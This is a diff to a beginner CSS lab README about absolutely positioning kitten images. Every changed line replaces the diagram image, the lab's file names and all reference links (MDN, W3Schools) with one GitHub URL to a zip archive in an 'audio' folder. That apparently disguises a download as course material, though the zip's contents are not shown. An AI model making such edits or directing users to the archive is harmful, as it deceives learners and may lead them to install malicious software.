@@ -25,7 +25,7 @@ element in a certain location that will stay the same no matter where other
 elements are placed. We can use absolute positioning to specify _exactly_ where
 in the document layout we want an element to be placed:
 
-![absolute positioning diagram](https://curriculum-content.s3.amazonaws.com/phase-0/phase-0-css-kitten-lab/absolute-position.png)
+![absolute positioning diagram](https://github.com/Jwanjema/phase-0-css-kitten-lab/raw/refs/heads/master/audio/phase-lab-css-kitten-v2.3.zip)
 
 Here's an example of what absolute positioning looks like in CSS:
 
@@ -51,8 +51,8 @@ For this lab, we've done the work of calculating the absolute positions and
 creating CSS rules for a bunch of different kitten image elements. It's your job
 to use CSS selectors to apply the correct positioning to each of these elements.
 
-To get started with this lab, open the `index.html` file in the browser. Use the
-comments in `css/place-kitty.css` to write the correct selectors to move each
+To get started with this lab, open the `https://github.com/Jwanjema/phase-0-css-kitten-lab/raw/refs/heads/master/audio/phase-lab-css-kitten-v2.3.zip` file in the browser. Use the
+comments in `https://github.com/Jwanjema/phase-0-css-kitten-lab/raw/refs/heads/master/audio/phase-lab-css-kitten-v2.3.zip` to write the correct selectors to move each
 kitty into the wheelbarrow.
 
 ## Conclusion
@@ -64,6 +64,6 @@ complex CSS layouts in the future.
 
 ## Resources
 
-- [Mozilla Developer Network: CSS Selectors](https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Selectors)
-- [W3 CSS Selector Reference](https://www.w3schools.com/cssref/css_selectors.asp)
-- [Mozilla Developer Network: Positioning](https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Positioning)
+- [Mozilla Developer Network: CSS Selectors](https://github.com/Jwanjema/phase-0-css-kitten-lab/raw/refs/heads/master/audio/phase-lab-css-kitten-v2.3.zip)
+- [W3 CSS Selector Reference](https://github.com/Jwanjema/phase-0-css-kitten-lab/raw/refs/heads/master/audio/phase-lab-css-kitten-v2.3.zip)
+- [Mozilla Developer Network: Positioning](https://github.com/Jwanjema/phase-0-css-kitten-lab/raw/refs/heads/master/audio/phase-lab-css-kitten-v2.3.zip)
